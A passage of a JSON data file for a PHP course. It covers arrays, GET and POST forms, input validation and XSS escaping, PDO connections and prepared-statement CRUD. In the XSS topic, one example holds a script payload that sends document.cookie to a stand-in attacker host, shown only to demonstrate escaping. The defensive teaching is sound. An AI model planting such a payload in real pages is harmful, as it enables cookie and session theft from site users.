                            "Execute pattern matching with PCRE regular expressions (preg_match)."
                        ]
                    },
                    "fundamentals": {
                        "concepts": "Arrays can be indexed numerically ($arr[0]) or associatively ($arr['key']). Strings can be single-quoted (literal evaluation) or double-quoted (variable interpolation enabled).",
                        "terminology": [
                            {"term": "Associative Array", "definition": "An array where keys are named strings rather than numeric integers."},
                            {"term": "explode()", "definition": "Splits a string by a delimiter into an indexed array."},
                            {"term": "implode() / join()", "definition": "Joins array elements with a string glue into a single concatenated string."},
                            {"term": "array_filter()", "definition": "Filters elements of an array using a callback predicate function."}
                        ],
                        "principles": "1. Immutability of Strings: PHP strings are byte arrays; operations produce new strings rather than in-place mutations.\n2. Key Uniqueness: Associative array keys must be unique; assigning to an existing key overwrites the prior value.",
                        "structures": "$assoc = ['id' => 1, 'name' => 'Alice']; | $parts = explode(',', $str); | $filtered = array_filter($data, fn($x) => $x > 50);"
                    },
                    "detailed_explanation": {
                        "sequence": [
                            "1. Array initialization using short syntax `[]` creates a Zend hashtable bucket structure.",
                            "2. Adding elements with `$arr[] = $val` assigns the next incremental integer key.",
                            "3. Sorting: `sort()` re-indexes numerically, `asort()` maintains associative key-value associations, `ksort()` sorts by keys.",
                            "4. Functional transformations: `array_map()` transforms every element; `array_filter()` extracts matching items; `array_reduce()` aggregates values.",
                            "5. String operations: `strlen()` measures byte count, `strpos()` finds substring offset, `str_replace()` performs substitutions, and `htmlspecialchars()` escapes HTML entities."
                        ],
                        "comparison_table": {
                            "headers": ["Function", "Input", "Return Value", "Key Preservation"],
                            "rows": [
                                ["sort($arr)", "Array (by ref)", "bool", "Re-indexes keys from 0 to N-1"],
                                ["asort($arr)", "Array (by ref)", "bool", "Preserves associative key-value pairs"],
                                ["ksort($arr)", "Array (by ref)", "bool", "Sorts array by keys alphabetically/numerically"],
                                ["array_map($fn, $arr)", "Callable, Array", "New transformed array", "Preserves original keys in single array mode"],
                                ["explode($glue, $str)", "Separator, String", "Indexed array of strings", "Creates sequential numeric indices 0..N"]
                            ]
                        },
                        "code_architecture": "<?php\n$students = [\n    ['name' => 'Tanmoy', 'marks' => 88],\n    ['name' => 'Priya', 'marks' => 64],\n    ['name' => 'Rohit', 'marks' => 95]\n];\n$distinction = array_filter($students, fn($s) => $s['marks'] >= 75);\n$names = array_column($distinction, 'name');\necho 'Distinction List: ' . implode(', ', $names);\n?>"
                    },
                    "diagram": {
                        "caption": "Figure 2.3: Array Data Processing Pipeline in PHP (filter -> map -> implode)",
                        "svg": "<svg viewBox='0 0 800 220' xmlns='http://www.w3.org/2000/svg' style='width:100%;height:auto;max-height:220px;background:#ffffff;border-radius:8px;border:1px solid #E5E9F1;'><rect x='30' y='40' width='180' height='140' rx='8' fill='#F7F8FC' stroke='#8DB9F0' stroke-width='1.5'/><text x='120' y='70' font-family='sans-serif' font-size='12' font-weight='700' fill='#377FE6' text-anchor='middle'>Input Recordset</text><text x='120' y='95' font-family='monospace' font-size='10' fill='#19283D'>['A'=>88, 'B'=>52, 'C'=>94]</text><text x='120' y='145' font-family='sans-serif' font-size='10' fill='#617087'>Raw Student Scores</text><path d='M 215 110 L 275 110' stroke='#377FE6' stroke-width='2.5'/><text x='245' y='100' font-family='sans-serif' font-size='9' font-weight='700' fill='#377FE6' text-anchor='middle'>filter(>=75)</text><rect x='280' y='40' width='180' height='140' rx='8' fill='#F7F8FC' stroke='#786CE5' stroke-width='1.5'/><text x='370' y='70' font-family='sans-serif' font-size='12' font-weight='700' fill='#786CE5' text-anchor='middle'>array_filter()</text><text x='370' y='95' font-family='monospace' font-size='10' fill='#19283D'>['A'=>88, 'C'=>94]</text><text x='370' y='145' font-family='sans-serif' font-size='10' fill='#617087'>Eliminated low scores</text><path d='M 465 110 L 525 110' stroke='#786CE5' stroke-width='2.5'/><text x='495' y='100' font-family='sans-serif' font-size='9' font-weight='700' fill='#786CE5' text-anchor='middle'>implode(', ')</text><rect x='530' y='40' width='220' height='140' rx='8' fill='#F7F8FC' stroke='#28A994' stroke-width='1.5'/><text x='640' y='70' font-family='sans-serif' font-size='12' font-weight='700' fill='#28A994' text-anchor='middle'>Formatted String</text><text x='640' y='100' font-family='monospace' font-size='11' font-weight='700' fill='#1B6F61'>\"Student A, Student C\"</text><text x='640' y='145' font-family='sans-serif' font-size='10' fill='#617087'>HTML Ready String Output</text></svg>"
                    },
                    "examples": {
                        "scenario": "Sanitizing CSV Input List of Student Emails",
                        "code": "<?php\n$csv_input = '  sourav@makaut.ac.in,  priya@test.com , admin@wb.gov.in ';\n$emails = array_map('trim', explode(',', $csv_input));\n$valid_emails = array_filter($emails, fn($e) => filter_var($e, FILTER_VALIDATE_EMAIL));\nprint_r($valid_emails);\n?>"
                    },
                    "important_points": [
                        "PHP arrays operate as dynamic hash maps accommodating both numeric and string keys.",
                        "`explode()` splits strings into arrays, while `implode()` joins arrays into single strings.",
                        "`asort()` sorts associative arrays while preserving key associations; `sort()` resets numeric keys.",
                        "`array_map()` transforms each item; `array_filter()` discards items failing a predicate test.",
                        "Double-quoted strings interpolate variables, whereas single-quoted strings treat them as literals."
                    ],
                    "revision": {
                        "summary": "Arrays and strings form the foundation of PHP data processing. Built-in functions like explode, implode, array_map, and array_filter enable declarative, bug-free data transformations.",
                        "terminology": "Associative Array, explode, implode, asort, array_map, array_filter.",
                        "mechanisms": "Hash table indexing -> Key lookups in O(1) time -> String buffer allocations.",
                        "common_mistakes": "Using `sort()` instead of `asort()` on associative database recordsets, obliterating primary key associations."
                    }
                }
            ]
        },
        {
            "module_no": 3,
            "title": "Forms Handling and User Input",
            "hours": 4,
            "marks": 5,
            "topics": [
                {
                    "id": "php_m3_t1",
                    "title": "Form Handling Mechanics: GET vs POST HTTP Methods & Superglobals",
                    "subtopics": ["Form Transmission Lifecycle", "$_GET vs $_POST vs $_REQUEST", "Idempotence and HTTP Specifications", "URL Encoding & Form Enctype Types"],
                    "intro": {
                        "definition": "Form handling is the computational bridge through which client-side users transmit form input data across HTTP to backend server scripts for processing, validation, and storage.",
                        "background": "HTML forms serialize input fields into key-value pairs encoded as application/x-www-form-urlencoded or multipart/form-data payloads depending on the selected HTTP method.",
                        "importance": "Choosing properly between GET and POST safeguards user credentials, prevents accidental double submissions, preserves URL bookmarking, and prevents data leakage in browser history logs.",
                        "objectives": [
                            "Distinguish GET from POST regarding visibility, caching, and payload size.",
                            "Inspect superglobal associative arrays: $_GET, $_POST, and $_SERVER.",
                            "Select proper form enctype attributes for binary uploads.",
                            "Implement Post/Redirect/Get (PRG) pattern to prevent duplicate form submissions."
                        ]
                    },
                    "fundamentals": {
                        "concepts": "GET appends serialized query parameters to the URL string (?key=value). POST transmits data invisibly within the HTTP request body. Superglobals are automatically populated associative arrays globally accessible across all scopes.",
                        "terminology": [
                            {"term": "Idempotent", "definition": "An HTTP method where multiple identical requests produce the same server state (e.g. GET)."},
                            {"term": "$_POST", "definition": "Superglobal array populated with variables submitted via HTTP POST."},
                            {"term": "multipart/form-data", "definition": "MIME enctype mandatory for forms transmitting file attachments."}
                        ],
                        "principles": "1. Idempotency Rule: Use GET exclusively for safe, read-only data queries; use POST for state-modifying actions (create, update, delete).\n2. Sensitive Data Rule: Never transmit passwords or credit cards via GET.",
                        "structures": "<form action='submit.php' method='POST' enctype='multipart/form-data'> <input name='user'> </form>"
                    },
                    "detailed_explanation": {
                        "sequence": [
                            "1. User completes form fields and clicks submit in the browser.",
                            "2. The browser serializes form elements into name=value pairs.",
                            "3. For GET: Pairs are appended to the action URL after a `?` delimiter.",
                            "4. For POST: Pairs are packaged into the HTTP request body with Content-Type header.",
                            "5. Web server intercepts the request and automatically populates $_GET or $_POST superglobals.",
                            "6. The PHP script processes input, performs validation, and executes database queries.",
                            "7. The script issues a 302 Redirect (PRG pattern) to avoid form re-submission on refresh."
                        ],
                        "comparison_table": {
                            "headers": ["Feature / Metric", "HTTP GET Method", "HTTP POST Method"],
                            "rows": [
                                ["Data Transmission", "Appended to URL query string", "Contained in HTTP request message body"],
                                ["Visibility", "Visible in browser address bar and logs", "Hidden from URL address bar and server logs"],
                                ["Maximum Length", "Restricted by browser/server (~2048 chars)", "Governed by post_max_size (e.g. 64MB)"],
                                ["Browser Caching", "Can be cached and bookmarked", "Never cached or bookmarked by default"],
                                ["Primary Purpose", "Safe retrieval and search filters", "Modifying state, logins, payments, mutations"]
                            ]
                        },
                        "code_architecture": "<?php\n// Post/Redirect/Get (PRG) Pattern\nif ($_SERVER['REQUEST_METHOD'] === 'POST') {\n    $email = filter_input(INPUT_POST, 'email', FILTER_VALIDATE_EMAIL);\n    if ($email) {\n        // Process subscription\n        header('Location: success.php?status=ok');\n        exit;\n    }\n}\n?>"
                    },
                    "diagram": {
                        "caption": "Figure 3.1: Protocol Architecture of HTTP GET vs POST Form Submission",
                        "svg": "<svg viewBox='0 0 800 240' xmlns='http://www.w3.org/2000/svg' style='width:100%;height:auto;max-height:240px;background:#ffffff;border-radius:8px;border:1px solid #E5E9F1;'><rect x='20' y='20' width='360' height='200' rx='10' fill='#F7F8FC' stroke='#377FE6' stroke-width='2'/><rect x='20' y='20' width='360' height='34' rx='10' fill='#377FE6'/><text x='200' y='43' font-family='sans-serif' font-size='13' font-weight='700' fill='#ffffff' text-anchor='middle'>HTTP GET (Idempotent / Safe Query)</text><text x='40' y='80' font-family='monospace' font-size='11' fill='#377FE6'>GET /search.php?q=php&amp;page=1 HTTP/1.1</text><text x='40' y='105' font-family='sans-serif' font-size='11' fill='#19283D'>• Data appended to URL query string</text><text x='40' y='125' font-family='sans-serif' font-size='11' fill='#19283D'>• Bookmarked &amp; cached by web browsers</text><text x='40' y='145' font-family='sans-serif' font-size='11' fill='#19283D'>• History logged in proxy and web servers</text><text x='40' y='175' font-family='sans-serif' font-size='11' font-weight='600' fill='#D65F64'>⚠ Never pass passwords or tokens via GET</text><rect x='420' y='20' width='360' height='200' rx='10' fill='#F7F8FC' stroke='#28A994' stroke-width='2'/><rect x='420' y='20' width='360' height='34' rx='10' fill='#28A994'/><text x='600' y='43' font-family='sans-serif' font-size='13' font-weight='700' fill='#ffffff' text-anchor='middle'>HTTP POST (Mutating / Secure Payload)</text><text x='440' y='80' font-family='monospace' font-size='11' fill='#1B6F61'>POST /login.php HTTP/1.1</text><text x='440' y='105' font-family='sans-serif' font-size='11' fill='#19283D'>• Payload sent inside HTTP request body</text><text x='440' y='125' font-family='sans-serif' font-size='11' fill='#19283D'>• Not bookmarked; invisible in URL bar</text><text x='440' y='145' font-family='sans-serif' font-size='11' fill='#19283D'>• Supports file uploads via multipart/form-data</text><text x='440' y='175' font-family='sans-serif' font-size='11' font-weight='600' fill='#369B72'>✓ Mandatory for login, registration &amp; payments</text></svg>"
                    },
                    "examples": {
                        "scenario": "Secure Registration Form Script",
                        "code": "<?php\nif ($_SERVER['REQUEST_METHOD'] === 'POST') {\n    $username = trim($_POST['username'] ?? '');\n    $password = $_POST['password'] ?? '';\n    if (empty($username) || strlen($password) < 8) {\n        $error = 'Invalid credentials provided.';\n    } else {\n        $msg = 'Account registered successfully.';\n    }\n}\n?>"
                    },
                    "important_points": [
                        "GET parameters are visible in the URL and must never contain passwords or private tokens.",
                        "POST sends parameters inside the HTTP request body and is mandatory for data modification.",
                        "Use `multipart/form-data` enctype whenever a form includes `<input type='file'>` elements.",
                        "`$_SERVER['REQUEST_METHOD']` identifies whether the request arrived via GET or POST.",
                        "Implement the Post/Redirect/Get (PRG) pattern to prevent duplicate form submission on refresh."
                    ],
                    "revision": {
                        "summary": "Form handling connects users to backend processing. GET is reserved for safe queries and search filters, while POST handles state changes and file uploads.",
                        "terminology": "GET, POST, $_POST, $_GET, Idempotency, enctype, PRG pattern.",
                        "mechanisms": "Browser Form -> HTTP POST Request Body -> Web Server -> PHP $_POST -> Processing -> HTTP 302 Redirect.",
                        "common_mistakes": "Sending passwords using GET forms, resulting in credential exposure in browser histories and proxy logs."
                    }
                },
                {
                    "id": "php_m3_t2",
                    "title": "User Input Validation, Sanitization & Defense Against Cross-Site Scripting (XSS)",
                    "subtopics": ["Validation vs Sanitization Principles", "filter_var() with Validation & Sanitization Flags", "HTML Entity Encoding (htmlspecialchars)", "Cross-Site Scripting (XSS) Mitigation"],
                    "intro": {
                        "definition": "Input validation verifies that incoming data conforms strictly to expected formats, types, and length constraints. Input sanitization removes or escapes potentially hazardous characters to neutralize injection attacks.",
                        "background": "Untrusted user inputs represent the number one threat vector in web security. Failure to sanitize output rendered in the browser allows Cross-Site Scripting (XSS), where attackers execute arbitrary JavaScript to hijack cookies and user sessions.",
                        "importance": "A software engineer must treat all external data as hostile. Utilizing PHP's native filtering extensions and output encoding is essential to building secure web platforms.",
                        "objectives": [
                            "Differentiate validation (data verification) from sanitization (data cleaning).",
                            "Utilize filter_var() with flags for emails, URLs, and integers.",
                            "Neutralize XSS using htmlspecialchars() with ENT_QUOTES and UTF-8 flags.",
                            "Design comprehensive server-side form error reporting routines."
                        ]
                    },
                    "fundamentals": {
                        "concepts": "Validation checks validity (e.g. is this an email address?). Sanitization strips malicious content (e.g. stripping `<script>` tags). Escaping encodes characters before outputting them to the browser.",
                        "terminology": [
                            {"term": "filter_var()", "definition": "Core PHP function that filters a variable with a specified filter flag."},
                            {"term": "htmlspecialchars()", "definition": "Converts special characters to HTML entities (&amp;, &quot;, &#039;, &lt;, &gt;) neutralizing XSS."},
                            {"term": "XSS (Cross-Site Scripting)", "definition": "Vulnerability allowing malicious actors to inject client-side scripts into viewed web pages."}
                        ],
                        "principles": "1. Validate on Input, Escape on Output: Validate incoming data strictly against whitelists; escape dynamic content right before rendering.\n2. Defense-in-Depth: Combine character filtering with Content Security Policy (CSP) headers.",
                        "structures": "$clean = filter_var($raw, FILTER_SANITIZE_EMAIL); | echo htmlspecialchars($data, ENT_QUOTES, 'UTF-8');"
                    },
                    "detailed_explanation": {
                        "sequence": [
                            "1. Receive untrusted payload from $_POST or $_GET.",
                            "2. Apply `trim()` to strip accidental leading/trailing whitespace.",
                            "3. Validate data format using `filter_var($email, FILTER_VALIDATE_EMAIL)`.",
                            "4. Check length constraints with `strlen()` and regex patterns via `preg_match()`.",
                            "5. If validation fails, return user-friendly errors without saving to database.",
                            "6. When rendering dynamic values back into HTML templates, pass every string through `htmlspecialchars($val, ENT_QUOTES, 'UTF-8')`.",
                            "7. The browser renders the markup safely as text without executing injected script tags."
                        ],
                        "comparison_table": {
                            "headers": ["Operation", "Function", "Action Taken", "Typical Use Case"],
                            "rows": [
                                ["Validation", "filter_var($x, FILTER_VALIDATE_INT)", "Returns int or false", "Validating product IDs or page counts"],
                                ["Sanitization", "filter_var($x, FILTER_SANITIZE_EMAIL)", "Strips invalid email characters", "Cleaning form text inputs"],
                                ["Output Escaping", "htmlspecialchars($x, ENT_QUOTES)", "Encodes HTML entity characters", "Preventing XSS in user comments and profiles"],
                                ["Whitespace Clean", "trim($x)", "Removes outer spaces/tabs/newlines", "Cleaning passwords and usernames"]
                            ]
                        },
                        "code_architecture": "<?php\n// Robust Input Validation & Sanitization Pipeline\n$email = trim($_POST['email'] ?? '');\n$comment = trim($_POST['comment'] ?? '');\n\nif (!filter_var($email, FILTER_VALIDATE_EMAIL)) {\n    $errors[] = 'A valid university email address is required.';\n}\nif (empty($comment)) {\n    $errors[] = 'Comment cannot be left blank.';\n}\n\n// Safe rendering against XSS\nfunction e(string $str): string {\n    return htmlspecialchars($str, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');\n}\n?>\n<div>\n  <p>User Email: <?= e($email) ?></p>\n  <p>Comment: <?= nl2br(e($comment)) ?></p>\n</div>"
                    },
                    "diagram": {
                        "caption": "Figure 3.2: Defense-in-Depth Pipeline: Input Validation and Output Escaping for XSS Prevention",
                        "svg": "<svg viewBox='0 0 800 220' xmlns='http://www.w3.org/2000/svg' style='width:100%;height:auto;max-height:220px;background:#ffffff;border-radius:8px;border:1px solid #E5E9F1;'><rect x='20' y='30' width='160' height='160' rx='8' fill='#F7F8FC' stroke='#D65F64' stroke-width='1.5'/><text x='100' y='60' font-family='sans-serif' font-size='12' font-weight='700' fill='#D65F64' text-anchor='middle'>Untrusted Input</text><text x='100' y='90' font-family='monospace' font-size='9' fill='#19283D'>&lt;script&gt;alert(1)&lt;/script&gt;</text><text x='100' y='140' font-family='sans-serif' font-size='10' fill='#617087'>User Form Submission</text><path d='M 185 110 L 235 110' stroke='#377FE6' stroke-width='2.5'/><rect x='240' y='30' width='170' height='160' rx='8' fill='#F7F8FC' stroke='#377FE6' stroke-width='1.5'/><text x='325' y='60' font-family='sans-serif' font-size='12' font-weight='700' fill='#377FE6' text-anchor='middle'>filter_var()</text><text x='325' y='85' font-family='sans-serif' font-size='10' fill='#19283D'>Validation Pipeline</text><text x='325' y='125' font-family='sans-serif' font-size='9' fill='#617087'>• FILTER_VALIDATE_EMAIL</text><text x='325' y='145' font-family='sans-serif' font-size='9' fill='#617087'>• FILTER_VALIDATE_INT</text><path d='M 415 110 L 465 110' stroke='#786CE5' stroke-width='2.5'/><rect x='470' y='30' width='170' height='160' rx='8' fill='#F7F8FC' stroke='#786CE5' stroke-width='1.5'/><text x='555' y='60' font-family='sans-serif' font-size='12' font-weight='700' fill='#786CE5' text-anchor='middle'>htmlspecialchars()</text><text x='555' y='85' font-family='sans-serif' font-size='10' fill='#19283D'>Output Encoding</text><text x='555' y='125' font-family='sans-serif' font-size='9' fill='#617087'>• ENT_QUOTES Flag</text><text x='555' y='145' font-family='sans-serif' font-size='9' fill='#617087'>• UTF-8 Charset</text><path d='M 645 110 L 695 110' stroke='#28A994' stroke-width='2.5'/><rect x='700' y='30' width='80' height='160' rx='8' fill='#E8F6F3' stroke='#28A994' stroke-width='1.5'/><text x='740' y='90' font-family='sans-serif' font-size='11' font-weight='700' fill='#28A994' text-anchor='middle'>Safe</text><text x='740' y='120' font-family='sans-serif' font-size='11' font-weight='700' fill='#28A994' text-anchor='middle'>HTML</text></svg>"
                    },
                    "examples": {
                        "scenario": "Live Comment Box Sanitization",
                        "code": "<?php\n$comment = '<script>document.location="http://attacker.com?c="+document.cookie</script>';\n// Unescaped output triggers XSS!\n// Protected output:\necho htmlspecialchars($comment, ENT_QUOTES, 'UTF-8');\n// Output in browser source: &lt;script&gt;document.location=...&lt;/script&gt;\n// Browser renders literal text without executing script!\n?>"
                    },
                    "important_points": [
                        "Never trust user input; validate incoming data types and lengths server-side.",
                        "`filter_var()` with `FILTER_VALIDATE_EMAIL` checks email syntax compliance.",
                        "`htmlspecialchars()` with `ENT_QUOTES` converts single and double quotes into HTML entities.",
                        "Cross-Site Scripting (XSS) allows attackers to steal user session cookies via injected scripts.",
                        "Always specify UTF-8 encoding when invoking `htmlspecialchars()` to avoid character-set injection exploits."
                    ],
                    "revision": {
                        "summary": "Secure applications validate data upon input and escape data before output. `filter_var()` validates formats, while `htmlspecialchars()` neutralizes XSS threats.",
                        "terminology": "Validation, Sanitization, htmlspecialchars, ENT_QUOTES, XSS, filter_var.",
                        "mechanisms": "Input -> Type Validation -> Character Sanitization -> Escaped HTML Entity Output.",
                        "common_mistakes": "Directly echoing $_GET or $_POST parameters into HTML without escaping, exposing users to reflected XSS attacks."
                    }
                }
            ]
        },
        {
            "module_no": 4,
            "title": "PHP and MySQL Integration",
            "hours": 6,
            "marks": 10,
            "topics": [
                {
                    "id": "php_m4_t1",
                    "title": "Connecting PHP to MySQL: MySQLi vs PDO Architecture & Connection Pooling",
                    "subtopics": ["MySQLi (Object-Oriented & Procedural)", "PDO (PHP Data Objects) Abstraction", "DSN Connection Strings & Error Modes", "Persistent Connections & Resource Teardown"],
                    "intro": {
                        "definition": "Database integration enables PHP scripts to persist, query, and manipulate relational data inside a MySQL server via native client libraries (MySQLi) or database abstraction interfaces (PDO).",
                        "background": "PHP originally provided legacy mysql_* functions, which were deprecated in PHP 5.5 and removed in PHP 7.0 due to security flaws and lack of prepared statement support. MySQLi and PDO are the modern standards.",
                        "importance": "Modern dynamic systems rely on database abstraction for performance, portability across database engines (Postgres, SQLite, MySQL), and built-in protection against SQL injection attacks.",
                        "objectives": [
                            "Compare MySQLi and PDO regarding multi-database portability and feature support.",
                            "Establish robust database connections handling timeouts and network errors.",
                            "Configure PDO error modes (ERRMODE_EXCEPTION) for structured try-catch exception handling.",
                            "Manage database connection resource lifecycles."
                        ]
                    },
                    "fundamentals": {
                        "concepts": "MySQLi is tailored specifically to MySQL servers, offering both object-oriented and procedural syntax. PDO is a vendor-neutral database access layer providing a uniform API across 12 different RDBMS drivers.",
                        "terminology": [
                            {"term": "PDO", "definition": "PHP Data Objects: A consistent object-oriented interface for interacting with relational databases."},
                            {"term": "MySQLi", "definition": "MySQL Improved: A specialized driver tailored to leverage advanced MySQL server features."},
                            {"term": "DSN (Data Source Name)", "definition": "Connection string specifying driver, host, port, and database name for PDO."}
                        ],
                        "principles": "1. Uniform Interface: Write database logic against abstraction layers to avoid vendor lock-in.\n2. Exception-Driven Error Handling: Always set error modes to throw exceptions on failure.",
                        "structures": "$pdo = new PDO('mysql:host=localhost;dbname=makaut_db;charset=utf8mb4', 'root', '', [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);"
                    },
                    "detailed_explanation": {
                        "sequence": [
                            "1. Construct the DSN string with database credentials and character encoding.",
                            "2. Instantiate a new `PDO` object inside a `try-catch` block.",
                            "3. Configure driver attributes: `PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION` and `PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC`.",
                            "4. If connection fails, catch `PDOException`, log the error, and display a user-friendly generic failure notice.",
                            "5. Execute database queries via prepared statements.",
                            "6. Close connection explicitly by setting `$pdo = null` or letting it terminate when script execution finishes."
                        ],
                        "comparison_table": {
                            "headers": ["Feature / Capability", "PDO Driver", "MySQLi Extension"],
                            "rows": [
                                ["Supported Databases", "12 different RDBMS (MySQL, Postgres, SQLite, Oracle)", "MySQL / MariaDB only"],
                                ["API Style", "Strictly Object-Oriented", "Dual: Object-Oriented & Procedural"],
                                ["Named Parameters", "Supported (:username, :id)", "Unsupported (uses positional ? only)"],
                                ["Performance", "Marginally slower due to abstraction layer", "Slightly faster for pure MySQL operations"],
                                ["Object Mapping", "Native FETCH_CLASS support into custom domain objects", "Limited object mapping capabilities"]
                            ]
                        },
                        "code_architecture": "<?php\n$dsn = 'mysql:host=localhost;dbname=bca_portal;charset=utf8mb4';\n$user = 'root';\n$pass = '';\n$options = [\n    PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,\n    PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,\n    PDO::ATTR_EMULATE_PREPARES => false,\n];\ntry {\n    $pdo = new PDO($dsn, $user, $pass, $options);\n} catch (PDOException $e) {\n    error_log('Database Connection Error: ' . $e->getMessage());\n    die('Database service unavailable.');\n}\n?>"
                    },
                    "diagram": {
                        "caption": "Figure 4.1: Architecture of PHP Database Abstraction: PDO vs MySQLi",
                        "svg": "<svg viewBox='0 0 800 240' xmlns='http://www.w3.org/2000/svg' style='width:100%;height:auto;max-height:240px;background:#ffffff;border-radius:8px;border:1px solid #E5E9F1;'><rect x='20' y='20' width='760' height='200' rx='10' fill='#F7F8FC' stroke='#377FE6' stroke-width='2'/><rect x='20' y='20' width='760' height='34' rx='10' fill='#377FE6'/><text x='400' y='43' font-family='sans-serif' font-size='13' font-weight='700' fill='#ffffff' text-anchor='middle'>PHP DATABASE CONNECTIVITY ARCHITECTURE</text><rect x='40' y='75' width='220' height='125' rx='8' fill='#ffffff' stroke='#786CE5' stroke-width='1.5'/><text x='150' y='100' font-family='sans-serif' font-size='12' font-weight='700' fill='#786CE5' text-anchor='middle'>Application Code</text><text x='55' y='130' font-family='sans-serif' font-size='11' fill='#19283D'>• Controller Layer</text><text x='55' y='150' font-family='sans-serif' font-size='11' fill='#19283D'>• Data Models</text><text x='55' y='170' font-family='sans-serif' font-size='11' fill='#617087'>• Business Logic</text><path d='M 265 135 L 315 135' stroke='#377FE6' stroke-width='2.5'/><rect x='320' y='75' width='240' height='125' rx='8' fill='#ffffff' stroke='#377FE6' stroke-width='1.5'/><text x='440' y='100' font-family='sans-serif' font-size='12' font-weight='700' fill='#377FE6' text-anchor='middle'>Driver Abstraction</text><rect x='335' y='115' width='100' height='65' rx='6' fill='#E9E8F8'/><text x='385' y='135' font-family='sans-serif' font-size='11' font-weight='700' fill='#786CE5' text-anchor='middle'>PDO</text><text x='385' y='155' font-family='sans-serif' font-size='9' fill='#617087' text-anchor='middle'>Multi-DB</text><rect x='445' y='115' width='100' height='65' rx='6' fill='#E8F6F3'/><text x='495' y='135' font-family='sans-serif' font-size='11' font-weight='700' fill='#28A994' text-anchor='middle'>MySQLi</text><text x='495' y='155' font-family='sans-serif' font-size='9' fill='#617087' text-anchor='middle'>MySQL Only</text><path d='M 565 135 L 615 135' stroke='#28A994' stroke-width='2.5'/><rect x='620' y='75' width='140' height='125' rx='8' fill='#ffffff' stroke='#28A994' stroke-width='1.5'/><text x='690' y='100' font-family='sans-serif' font-size='12' font-weight='700' fill='#28A994' text-anchor='middle'>MySQL 8.0</text><text x='635' y='130' font-family='sans-serif' font-size='11' fill='#19283D'>• Port 3306</text><text x='635' y='150' font-family='sans-serif' font-size='11' fill='#19283D'>• InnoDB</text><text x='635' y='170' font-family='sans-serif' font-size='11' fill='#617087'>• ACID Store</text></svg>"
                    },
                    "examples": {
                        "scenario": "Verifying Connection and Displaying Server Status",
                        "code": "<?php\nrequire_once 'db_config.php';\n$stmt = $pdo->query('SELECT VERSION() as v, NOW() as current_time');\n$row = $stmt->fetch();\necho 'Connected to MySQL: ' . $row['v'] . ' at ' . $row['current_time'];\n?>"
                    },
                    "important_points": [
                        "Legacy `mysql_*` functions are obsolete and removed; use PDO or MySQLi.",
                        "PDO supports 12 different database management systems, whereas MySQLi supports MySQL only.",
                        "Always enable `PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION` for structured exception handling.",
                        "Use `charset=utf8mb4` in DSN to support full multilingual Unicode characters and emojis.",
                        "Closing database connections explicitly helps free server memory in high-throughput environments."
                    ],
                    "revision": {
                        "summary": "Database connectivity in modern PHP is handled by PDO or MySQLi. PDO is preferred for its vendor portability, named parameters, and flexible error handling.",
                        "terminology": "PDO, MySQLi, DSN, ERRMODE_EXCEPTION, utf8mb4, connection pooling.",
                        "mechanisms": "DSN Parse -> TCP Socket Creation -> Auth Handshake -> Exception Handler Registration.",
                        "common_mistakes": "Failing to catch PDOException, causing database credentials and file paths to be displayed on error screens."
                    }
                },
                {
                    "id": "php_m4_t2",
                    "title": "CRUD Operations: Prepared Statements, Parameter Binding & Result Processing",
                    "subtopics": ["Create (INSERT), Read (SELECT), Update (UPDATE), Delete (DELETE)", "SQL Injection Mechanics & Vulnerabilities", "Prepared Statements with Parameter Binding", "Result Set Iteration (fetch, fetchAll, fetchColumn)"],
                    "intro": {
                        "definition": "CRUD represents the four foundational data persistence operations in software engineering: Create, Read, Update, and Delete. Executing CRUD securely requires prepared statements where SQL logic is strictly separated from user data parameters.",
                        "background": "SQL injection occurs when untrusted input is concatenated directly into SQL queries, allowing attackers to manipulate queries to bypass authentication or dump database tables.",
                        "importance": "Using prepared statements is the primary industry standard defense against SQL injection, ensuring database security and integrity.",
                        "objectives": [
                            "Implement secure INSERT, SELECT, UPDATE, and DELETE operations with PDO.",
                            "Explain why prepared statements neutralize SQL injection attacks.",
                            "Bind parameters safely using bindParam() and bindValue().",
                            "Process result sets using fetch(), fetchAll(), and rowCount()."
                        ]
                    },
                    "fundamentals": {
                        "concepts": "Prepared statements divide query execution into two phases: compilation and execution. In the compilation phase, the database compiles the SQL template with placeholders. In the execution phase, parameters are bound as pure literal values that can never alter the query structure.",
                        "terminology": [
                            {"term": "Prepared Statement", "definition": "A pre-compiled SQL template containing parameter markers (? or :name) sent to the database engine prior to data binding."},
                            {"term": "Parameter Binding", "definition": "The mechanism that maps PHP variables to statement placeholders as literal values."},
                            {"term": "SQL Injection", "definition": "A critical vulnerability where malicious SQL commands are injected into database queries through untrusted user input."}
                        ],
                        "principles": "1. Complete Separation of Code and Data: Never concatenate user variables directly into SQL strings.\n2. Transactional Atomicity: Wrap multi-step mutations in database transactions (`beginTransaction()`, `commit()`, `rollBack()`).",
                        "structures": "$stmt = $pdo->prepare('SELECT * FROM users WHERE email = :e'); $stmt->execute([':e' => $email]); $user = $stmt->fetch();"
                    },
                    "detailed_explanation": {
                        "sequence": [
                            "1. Formulate SQL query with placeholders: `INSERT INTO students (name, email, gpa) VALUES (:name, :email, :gpa)`.",
                            "2. Transmit template to database via `$stmt = $pdo->prepare($sql)`.",
                            "3. Database engine parses, plans, and compiles the SQL execution plan.",
                            "4. Bind user values safely: `$stmt->execute([':name' => $name, ':email' => $email, ':gpa' => $gpa])`.",
                            "5. Retrieve results with `$stmt->fetch()` (single row) or `$stmt->fetchAll()` (multiple rows).",
                            "6. Check mutated record count using `$stmt->rowCount()` for UPDATE and DELETE operations.",
                            "7. Catch any `PDOException` and execute `$pdo->rollBack()` if running within a transaction."
                        ],
                        "comparison_table": {
                            "headers": ["Operation", "SQL Keyword", "PHP Execution Pattern", "Expected Output / Check"],
                            "rows": [
                                ["Create", "INSERT INTO", "$stmt->execute($params)", "$pdo->lastInsertId() returns new primary key"],
                                ["Read", "SELECT ... FROM", "$stmt->fetch() / fetchAll()", "Array of record rows or false if not found"],
                                ["Update", "UPDATE ... SET", "$stmt->execute($params)", "$stmt->rowCount() returns modified row count"],
                                ["Delete", "DELETE FROM", "$stmt->execute($params)", "$stmt->rowCount() returns deleted row count"]
                            ]
                        },
